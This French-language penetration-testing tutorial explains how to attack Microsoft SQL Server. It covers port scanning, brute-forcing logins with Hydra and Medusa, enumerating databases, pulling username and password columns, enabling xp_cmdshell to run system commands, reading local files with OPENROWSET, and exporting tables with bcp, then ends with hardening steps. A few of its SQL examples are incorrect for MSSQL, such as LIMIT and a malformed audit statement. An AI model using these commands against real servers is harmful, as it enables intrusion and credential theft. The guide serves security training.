# MSSQL

### **MSSQL - Guide Complet avec Commandes SQL Fondamentales**

⚠️ **Avertissement** : Ce contenu est strictement destiné à un usage éducatif et éthique dans le domaine de la cybersécurité. Toute utilisation illégale ou malveillante est interdite et engage la seule responsabilité de l’utilisateur.

***

### **Introduction**

Microsoft SQL Server (MSSQL) est un système de gestion de bases de données relationnelles largement utilisé dans les environnements professionnels. Lors d’un pentest, MSSQL peut être une cible intéressante pour découvrir des données sensibles, des vulnérabilités ou des configurations faibles. Ce guide fournit une méthodologie détaillée pour énumérer, interagir et exploiter MSSQL dans un cadre légal et éthique.

***

### **🚀 Étape 1 : Préparer l'Accès à MSSQL**

**1.1 Identifier le Port MSSQL**

Par défaut, MSSQL utilise le port **1433** (TCP). Utilisez **Nmap** pour détecter les services MSSQL actifs :

```bash
nmap -p 1433 -sV <target>
```

**Exemple de sortie :**

```sql
1433/tcp open  ms-sql-s Microsoft SQL Server 2019
```

**Explications :**

* `1433` : Port par défaut pour MSSQL.
* `ms-sql-s` : Service MSSQL identifié.

***

**1.2 Tester l’Accès avec des Identifiants**

Si des identifiants sont disponibles, connectez-vous via **sqlcmd** (client MSSQL) ou **mssqlclient.py** d’Impacket.

**Avec sqlcmd :**

```bash
sqlcmd -S <host> -U <username> -P <password>
```

**Exemple :**

```bash
sqlcmd -S 192.168.1.10 -U sa -P Password123
```

**Avec mssqlclient.py :**

```bash
python3 mssqlclient.py <username>@<host> -windows-auth
```

**Exemple :**

```bash
python3 mssqlclient.py sa@192.168.1.10
```

***

**1.3 Brute-Force des Identifiants**

Si les identifiants sont inconnus, utilisez des outils comme **Hydra** ou **Medusa** pour brute-forcer les comptes.

**Avec Hydra :**

```bash
hydra -L usernames.txt -P passwords.txt -s 1433 <target> mssql
```

**Avec Medusa :**

```bash
medusa -h <target> -u sa -P passwords.txt -M mssql
```

***

### **🔍 Étape 2 : Énumération des Bases et Utilisateurs**

**2.1 Lister les Bases de Données**

Après vous être connecté, utilisez cette commande pour afficher toutes les bases disponibles :

```sql
SELECT name FROM master.dbo.sysdatabases;
```

**Exemple de sortie :**

```diff
+--------------------+
| name               |
+--------------------+
| master             |
| tempdb             |
| model              |
| msdb               |
| ecommerce          |
| employees          |
+--------------------+
```

***

**2.2 Explorer les Tables d’une Base**

Sélectionnez une base de données et affichez ses tables :

```sql
USE <database_name>;
SELECT * FROM information_schema.tables;
```

**Exemple :**

```sql
USE ecommerce;
SELECT * FROM information_schema.tables;
```

***

**2.3 Lister les Colonnes d’une Table**

Pour examiner la structure d’une table, utilisez :

```sql
SELECT COLUMN_NAME, DATA_TYPE FROM information_schema.columns WHERE TABLE_NAME = '<table_name>';
```

**Exemple :**

```sql
SELECT COLUMN_NAME, DATA_TYPE FROM information_schema.columns WHERE TABLE_NAME = 'users';
```

**Exemple de sortie :**

```sql
+------------+-----------+
| COLUMN_NAME| DATA_TYPE |
+------------+-----------+
| id         | int       |
| username   | varchar   |
| password   | varchar   |
| email      | varchar   |
+------------+-----------+
```

***

**2.4 Lister les Utilisateurs MSSQL**

Interrogez la table `syslogins` pour identifier les utilisateurs :

```sql
SELECT name, dbname FROM master.dbo.syslogins;
```

**Exemple de sortie :**

```diff
+----------+-----------+
| name     | dbname    |
+----------+-----------+
| sa       | master    |
| admin    | ecommerce |
| user1    | employees |
+----------+-----------+
```

***

**2.5 Vérifier les Privilèges des Utilisateurs**

Pour voir les permissions d’un utilisateur spécifique :

```sql
EXEC sp_helprotect NULL, '<username>';
```

**Exemple :**

```sql
EXEC sp_helprotect NULL, 'admin';
```

***

### **🛠️ Étape 3 : Exploitation et Recherche de Données Sensibles**

**3.1 Lire les Données d'une Table**

Pour afficher les données contenues dans une table, utilisez :

```sql
SELECT * FROM <table_name> LIMIT <n>;
```

**Exemple :**

```sql
SELECT * FROM users LIMIT 10;
```

***

**3.2 Rechercher des Données Critiques**

*   **Identifiants ou mots de passe :**

    ```sql
    SELECT username, password FROM users;
    ```
*   **Emails :**

    ```sql
    SELECT email FROM customers;
    ```

***

**3.3 Exécution de Commandes Système**

Si vous disposez des privilèges `sysadmin`, activez le mode **xp\_cmdshell** pour exécuter des commandes système :

1.  Activer `xp_cmdshell` :

    ```sql
    EXEC sp_configure 'show advanced options', 1;
    RECONFIGURE;
    EXEC sp_configure 'xp_cmdshell', 1;
    RECONFIGURE;
    ```
2.  Exécuter une commande système :

    ```sql
    EXEC xp_cmdshell 'dir C:\';
    ```

***

**3.4 Lire des Fichiers Locaux**

Utilisez `OPENROWSET` pour lire un fichier local si les permissions le permettent :

```sql
SELECT * FROM OPENROWSET(BULK N'C:\path\to\file.txt', SINGLE_CLOB) AS FileContents;
```

***

### **🔧 Étape 4 : Exporter et Sauvegarder les Données**

**4.1 Exporter une Table avec `BCP`**

Si vous avez accès au serveur MSSQL, utilisez l’outil `bcp` pour exporter des données :

```bash
bcp <database_name>.dbo.<table_name> out data.txt -c -U <username> -P <password> -S <host>
```

**Exemple :**

```bash
bcp ecommerce.dbo.users out users.txt -c -U sa -P Password123 -S 192.168.1.10
```

***

**4.2 Sauvegarder une Base**

Créez une sauvegarde de la base si vous avez les permissions :

```sql
BACKUP DATABASE <database_name> TO DISK = 'C:\path\to\backup.bak';
```

***

### **🔒 Étape 5 : Contre-Mesures et Sécurisation**

**5.1 Restreindre les Privilèges**

Révoquez les permissions inutiles pour les utilisateurs :

```sql
REVOKE ALL ON <database_name> FROM '<username>';
```

***

**5.2 Désactiver `xp_cmdshell`**

Désactivez `xp_cmdshell` pour éviter les exécutions de commandes système :

```sql
EXEC sp_configure 'xp_cmdshell', 0;
RECONFIGURE;
```

***

**5.3 Activer un Pare-feu**

Filtrez les connexions au port **1433** et limitez les accès aux IP autorisées.

***

**5.4 Auditer et Surveiller les Activités**

Activez l’audit MSSQL pour surveiller les activités suspectes :

```sql
CREATE SERVER AUDIT [AuditName]
TO FILE (FILEPATH = 'C:\Audit\');
ENABLE;
```

***

### **Résumé des Commandes Clés**

| Commande SQL                                | Description                                  |
| ------------------------------------------- | -------------------------------------------- |
| `SELECT name FROM master.dbo.sysdatabases;` | Liste toutes les bases de données.           |
| `SELECT * FROM information_schema.tables;`  | Liste les tables d’une base.                 |
| `SELECT COLUMN_NAME, DATA_TYPE FROM ...;`   | Affiche les colonnes d’une table.            |
| `SELECT * FROM users LIMIT 10;`             | Affiche les 10 premières lignes d'une table. |
| `EXEC xp_cmdshell '<commande>';`            | Exécute une commande système (si activé).    |
| `BACKUP DATABASE <database_name> ...;`      | Sauvegarde une base MSSQL.                   |

***

#### **Conclusion**

Ce guide couvre les étapes nécessaires pour énumérer, interagir et exploiter MSSQL dans un cadre de pentest. Il inclut également des techniques pour protéger les serveurs MSSQL contre les abus. Utilisez toujours ces connaissances de manière éthique et légale pour sécuriser les systèmes et améliorer leur résilience.

***

**Liens utiles :**

* [Mentions légales](https://dika-1.gitbook.io/road-to-hacker/mentions-legales)
* [Politique de confidentialité](https://dika-1.gitbook.io/road-to-hacker/politique-de-confidentialite)
* [Contactez-nous](mailto:dika-road-to-hacker@protonmail.com)
